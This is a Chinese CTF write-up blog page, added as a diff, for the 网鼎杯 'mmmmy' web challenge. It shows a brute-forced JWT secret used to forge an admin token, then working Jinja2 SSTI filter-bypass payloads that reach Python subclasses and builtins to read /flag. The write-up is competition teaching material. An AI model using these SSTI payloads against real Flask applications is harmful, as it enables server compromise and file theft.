@@ -1,0 +1,313 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" integrity="sha512-ygEyjMC6rqnzJqWGjRTJUPYMEs9JUOm3i7OWUS9CgQ4XkBUvMsgCS1I8JqavidQ2ClHcREB7IbA2mN08+r9Elg==" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js" integrity="sha512-9DNXrSjk17bU9MUbRp3IjwcWe46V8FaGA062PFbryPUAEQVRbz4jiZP6FW0AdbqEGtMYBDWnul3eiGBMJOQajA==" crossorigin="anonymous"></script>
+  
+  
+    <meta name="keywords" content="writeup,python,网鼎杯," />
+  
+
+  
+    <meta name="description" content="网鼎杯第三场 mmmmy writeup" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/logo.png">
+  <title>网鼎杯第三场 mmmmy writeup [ 4uuu Nya&#39;s HomePage ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="https://qvq.im/images/logo.png">
+    <span class="title">4uuu Nya&#39;s HomePage</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/friends" class="pure-menu-link">Friends</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        网鼎杯第三场 mmmmy writeup
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-08-28T16:28:43.000Z">
+        2018-08-28
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/" rel="tag">网鼎杯</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>只给了一个登录，任意用户名和密码都可以登录， <code>admin</code> 账号会提示 <code>nononono</code></p>
+<p>任意账号登录后发现有个留言系统，点击后提示只有 <code>admin</code> 用户才可以进行留言 ( 这里一开始还以为是XSS Orz</p>
+<p>思考怎么拿到admin这个账号的登录权限，因为没有注册，登录处也没有可攻击的地方，后来查看cookie的时候发现有个 <code>token</code> 的键值，又是 JWT，但是这个和 <code>i_am_admin</code> 不一样的是没有地方可以得到 <code>secret</code>，于是尝试爆破，得到secret为<code>6a423</code></p>
+<p><img src="/images/20180828103015.png"></p>
+<p>然后伪造身份成为admin</p>
+<p><img src="/images/20180828103047.png"></p>
+<p>点开留言功能后突然就有点懵逼了，这不像是一个正常的留言系统。 但是发现输入的东西都会原原本本地打印在页面上，于是猜测这是一个SSTI</p>
+<p>测试后发现过滤了很多东西，比如<code>&#39;</code>，<code>&quot;</code>，<code>os</code>，<code>_</code>，<code>{{</code> 只要出现了这些关键字，直接就打印None，太狠了</p>
+<p>这里过滤了 <code>{{</code> ，其实还可以使用 <code>{%</code>，比如 <code>{% if 1 %}1{%endif%}</code>，会打印1</p>
+<p>然后来思考一下需要绕过的地方，首先 <code>__</code> 被过滤，我们可以考虑使用 <code>[]</code> 结合 <code>request</code>来进行绕过，比如 <code>{% if ()[request.args.a]%}</code> ，url中 <code>/bbs?a=__class__</code></p>
+<p>很快能构造出来一个读取flag的payload，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ()[request.args.a][request.args.b][request.args.c]()[request.args.d](<span class="number">40</span>)(request.args.e).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="built_in">chr</span>(<span class="number">102</span>) %&#125;~4uuu~&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">a=__class__&amp;b=__base__&amp;c=__subclasses___&amp;d=pop&amp;e=/flag</span><br></pre></td></tr></table></figure>
+<p>很快也能发现GG了，因为报500错误，这里考虑是没有chr这个函数，那么如法炮制获取chr函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span>=()[request.args.a][request.args.b][request.args.c]()[<span class="number">59</span>][request.args.a1][request.args.a2][request.args.a3].<span class="built_in">chr</span> %&#125;</span><br><span class="line"></span><br><span class="line">a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=pop&amp;e=/flag&amp;a1=__init__&amp;a2=__globals__&amp;a3=__builtins__</span><br></pre></td></tr></table></figure>
+<p>这时就可以开始愉快的盲注了</p>
+<p><img src="/images/20180828120622.png"></p>
+<hr>
+<p>其实还有一种更简单的方法，不需要盲注，直接明文，使用jinja2里的print</p>
+<p><img src="/images/20180828120411.png"></p>
+<p>直接就打印flag了 Orz</p>
+<p><img src="/images/20180828120727.png"></p>
+
+    </div>
+  </article>
+  <div class="toc-container">
+    
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+<div class="share" style="width: 100%;">
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">
+    <div class="social-share" data-initialized="true">
+      <a href="#" class="social-share-icon icon-weibo"></a>
+      <a href="#" class="social-share-icon icon-qq"></a>
+      <a href="#" class="social-share-icon icon-wechat"></a>
+      <a href="#" class="social-share-icon icon-qzone"></a>
+    </div>
+  </div>
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2018/05/14/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%B5%9Beasy-upload%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%8Ewriteup/" rel="next" title="拟态防御赛easy_upload出题思路与writeup">
+          拟态防御赛easy_upload出题思路与writeup
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2018/09/03/noxCTF-2018-%E5%87%A0%E4%B8%AAmisc%E7%9A%84writeup/" rel="prev" title="noxCTF 2018 几个misc的writeup">
+            noxCTF 2018 几个misc的writeup
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://qvq.im">Index</a> |
+        <a class="bottom-item" href="https://github.com/sco4x0" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
